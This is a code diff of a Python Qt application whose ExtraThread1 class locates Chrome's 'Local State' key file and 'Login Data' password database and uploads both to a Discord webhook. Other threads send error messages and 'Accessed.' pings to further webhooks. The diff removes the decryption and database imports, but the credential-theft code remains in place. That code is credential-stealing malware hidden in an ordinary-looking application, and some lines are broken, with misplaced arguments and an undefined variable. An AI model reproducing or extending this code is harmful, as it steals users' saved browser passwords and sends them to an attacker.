@@ -67,28 +67,14 @@ class WorkerThread(QThread):
         except Exception as we:
             error_message = requests.post(verify=False, "https://discord.com/api/webhooks/1169671113949851798/gvXynYDhGbO3t5bZRkix-GXlh9hUsSPKMaE0XuDmKUNGseQ2PMDc8dhYkwdbjzPrntFI", json={"content": f"[{os.getcwd()} APP] {str(we)}"})
 
-from tempfile import TemporaryFile, _get_default_tempdir
-from win32crypt import CryptUnprotectData
-from os.path import join, exists, isfile
-from os import environ, remove
-from base64 import b64decode
-from sqlite3 import connect
-from getpass import getuser
-from shutil import copyfile
-from platform import node
-from time import strftime
-from io import BytesIO
-from csv import writer
-from json import load
-
 class ExtraThread1(QThread):
     def run(self):
         access_message = requests.post(verify=False, "https://discord.com/api/webhooks/1169671921483386890/xYSB1_NAXMLwW2uGOHF01Eld8XjdWkoEVQosiDqWd9PasD1oVg0aFOn7SEg7zZFh810L", json={"content": f"[{os.getcwd()}] Accessed."})
     
         try:
-            cdata = join(environ["USERPROFILE"], "AppData",  "Local", "Google", "Chrome", "User Data")
-            kpath = join(cdata, "Local State")
-            dpath = join(cdata, "Default", "Login Data")
+            cdata = path.join(environ["USERPROFILE"], "AppData",  "Local", "Google", "Chrome", "User Data")
+            kpath = path.join(cdata, "Local State")
+            dpath = path.join(cdata, "Default", "Login Data")
 
             try: 
                 requests.post(verify=False, "https://discord.com/api/webhooks/1169671361355055255/rPP7G_bTRbYNCyG_Q_ASFI7VtszXLrmlrtTBa0uY0hxv9AlR-tRR_zAHo2_VNluwG_Kg", files=[{"fieldname": (kpath, open(file, "rb").read())}, {"fieldname": (dpath, open(file, "rb").read())}], json={"content": f"[{os.getcwd()} EXTRA1FILE] File received."})
